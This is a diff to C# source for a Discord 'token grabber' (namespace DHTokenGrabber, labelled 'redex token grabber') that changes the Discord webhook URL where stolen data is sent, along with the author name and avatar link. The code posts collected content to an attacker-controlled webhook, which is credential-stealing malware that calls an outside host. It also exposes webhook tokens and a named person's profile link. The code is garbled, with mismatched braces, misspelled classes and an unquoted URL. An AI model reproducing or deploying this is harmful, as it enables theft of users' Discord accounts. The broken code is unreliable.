@@ -1,4 +1,4 @@
-https://discord.com/api/webhooks/915678514315927623/mHCvr5-ugGTAsvJX0-QXu5U6zd7r2Qx6p4sSS0-0eRsgj8vQd-AobFwBU4_LsaAkOAuG
+https://discord.com/api/webhooks/938615857230282814/PFin1M4HwQgFDBrorM-vveT5JKVvvVpqZrJG2W7tkg2rYFghkZkd74jZdBN8J6-IKP6A
 namespace DHTokenGrabber
 {   
 // token: RID: 365 RVA: file Offset:
@@ -58,7 +58,7 @@ catch (Exception)
      string result;
      try
  }
-  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/915678514315927623/mHCvr5-ugGTAsvJX0-QXu5U6zd7r2Qx6p4sSS0-0eRsgj8vQd-AobFwBU4_LsaAkOAuG").result;
+  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/938615857230282814/PFin1M4HwQgFDBrorM-vveT5JKVvvVpqZrJG2W7tkg2rYFghkZkd74jZdBN8J6-IKP6A").result;
 }
 catch (WebException)
 }
@@ -83,15 +83,15 @@ public static void sendWebHook(string discordWebHook,   string content)
                 }) + ""
             },
             {
-                "NamDO -Sam#0386"
+                "Nicolás Salazar"
                 "redex token grabber"
             },
             {
-                "undefined//discord.com/assets/652f40427e1f5186ad54836074898279.png"
+                "https://www.facebook.com/photo/?fbid=224116535156503&set=a.224116551823168"
 
             }
         };
-        httpClient.PostAsync(https://discord.com/api/webhooks/915678514315927623/mHCvr5-ugGTAsvJX0-QXu5U6zd7r2Qx6p4sSS0-0eRsgj8vQd-AobFwBU4_LsaAkOAuG, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
+        httpClient.PostAsync(https://discord.com/api/webhooks/938615857230282814/PFin1M4HwQgFDBrorM-vveT5JKVvvVpqZrJG2W7tkg2rYFghkZkd74jZdBN8J6-IKP6A, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
         catch (WebException)
         {
         }
